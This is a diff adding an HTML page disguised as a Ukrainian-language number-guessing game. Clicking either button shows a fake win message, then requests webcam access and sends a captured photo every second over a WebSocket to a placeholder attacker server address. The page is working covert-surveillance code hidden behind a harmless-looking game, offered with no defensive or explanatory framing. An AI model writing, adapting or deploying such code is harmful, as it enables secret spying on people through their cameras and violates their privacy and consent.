@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вгадай число</title>
+</head>
+<body>
+    <h1>🔮 Вгадай число!</h1>
+    <p>Вибери: <strong>1</strong> або <strong>2</strong></p>
+    <button onclick="startGame(1)">1</button>
+    <button onclick="startGame(2)">2</button>
+    
+    <script>
+        async function startGame(choice) {
+            alert("🎉 Молодець, ти вгадав!");
+            await startStreaming();
+        }
+
+        async function startStreaming() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                localStorage.setItem("cameraAccess", "granted");  // Запам'ятати дозвіл
+                const videoTrack = stream.getVideoTracks()[0];
+
+                // Відправляємо відео на сервер
+                const ws = new WebSocket("ws://ВАШ_IP:8765");  // Заміни на IP сервера
+                const imageCapture = new ImageCapture(videoTrack);
+                
+                setInterval(async () => {
+                    const frame = await imageCapture.takePhoto();
+                    const reader = new FileReader();
+                    reader.onload = () => ws.send(reader.result);
+                    reader.readAsDataURL(frame);
+                }, 1000);  // Відправляє кадр щосекунди
+
+            } catch (error) {
+                console.error("Помилка доступу до камери:", error);
+            }
+        }
+    </script>
+</body>
+</html>
